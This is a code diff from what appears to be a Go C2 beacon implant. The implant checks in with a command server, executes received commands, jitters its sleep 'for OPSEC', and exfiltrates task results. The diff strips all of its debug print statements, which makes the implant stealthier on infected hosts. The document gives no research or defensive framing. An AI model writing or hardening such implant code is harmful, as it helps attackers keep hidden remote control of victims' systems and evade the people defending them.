@@ -135,7 +135,6 @@ func (b *Beacon) executeCommand(command string) string {
 	// Add panic recovery to prevent beacon crash on command execution errors
 	defer func() {
 		if r := recover(); r != nil {
-			fmt.Printf("[ERROR] Command execution panic: %v\n", r)
 		}
 	}()
 
@@ -445,18 +444,13 @@ func (b *Beacon) runBeacon() {
 	for b.running {
 		// Randomize sleep interval between min and max for OPSEC
 		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
-		fmt.Printf("[Beacon] Sleeping for %v seconds...\n", sleepDuration.Seconds())
 		time.Sleep(sleepDuration)
 
 		// Send check-in - if it fails, beacon continues trying
-		fmt.Printf("[Beacon] Sending check-in...\n")
 		response, err := b.checkIn()
 		if err != nil {
-			// Log failure for debugging
-			fmt.Printf("[Beacon] Check-in failed: %v, retrying after next sleep\n", err)
 			continue
 		}
-		fmt.Printf("[Beacon] Check-in response: %s\n", response)
 
 		// Check for DOMAINS response (sent on first check-in)
 		if strings.HasPrefix(response, "DOMAINS|") {
@@ -525,7 +519,6 @@ func (b *Beacon) runBeacon() {
 				defer func() {
 					if r := recover(); r != nil {
 						errorMsg := fmt.Sprintf("Task execution panic: %v", r)
-						fmt.Printf("[ERROR] %s\n", errorMsg)
 						// Try to report the error back to C2
 						b.exfiltrateResult(errorMsg, taskID)
 					}
